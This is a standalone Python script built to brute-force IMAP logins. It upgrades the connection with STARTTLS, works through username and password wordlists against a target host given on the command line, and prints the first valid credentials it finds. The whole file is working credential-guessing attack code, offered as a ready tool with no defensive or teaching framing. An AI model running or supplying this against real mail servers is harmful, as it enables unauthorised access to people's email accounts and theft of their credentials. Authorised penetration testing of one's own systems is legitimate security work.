#!/usr/bin/env python3
import imaplib
import argparse

def brute_force_imap(host, port, usernames, passwords, verbose=False):
    for user in usernames:
        for pwd in passwords:
            try:
                if verbose:
                    print(f"\n[~] Connecting to {host}:{port} for {user}:{pwd}")
                imap = imaplib.IMAP4(host, port)

                if verbose:
                    print("[~] Server greeting:", repr(imap.welcome))

                if verbose:
                    print("[~] Starting TLS...")
                starttls_resp = imap.starttls()
                if verbose:
                    print("[~] STARTTLS response:", repr(starttls_resp))

                if verbose:
                    print(f"[~] Attempting login: {user}:{pwd}")
                login_resp = imap.login(user, pwd)
                print(f"[+] Valid credentials found: {user}:{pwd}")
                if verbose:
                    print("[~] Server login response:", repr(login_resp))
                imap.logout()
                return  # Exit on first success

            except imaplib.IMAP4.error as e:
                if verbose:
                    print(f"[-] Login failed: {user}:{pwd}")
                    print(f"[~] Server error message: {e}")
            except Exception as e:
                print(f"[!] Connection error on {user}:{pwd} -> {e}")

def load_file(path):
    with open(path, "r") as f:
        return [line.strip() for line in f if line.strip()]

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IMAP brute-force (STARTTLS)")
    parser.add_argument("host", help="Target IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=143, help="IMAP port (default 143)")
    parser.add_argument("-U", "--users", required=True, help="File with usernames")
    parser.add_argument("-P", "--passwords", required=True, help="File with passwords")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    usernames = load_file(args.users)
    passwords = load_file(args.passwords)

    brute_force_imap(args.host, args.port, usernames, passwords, verbose=args.verbose)
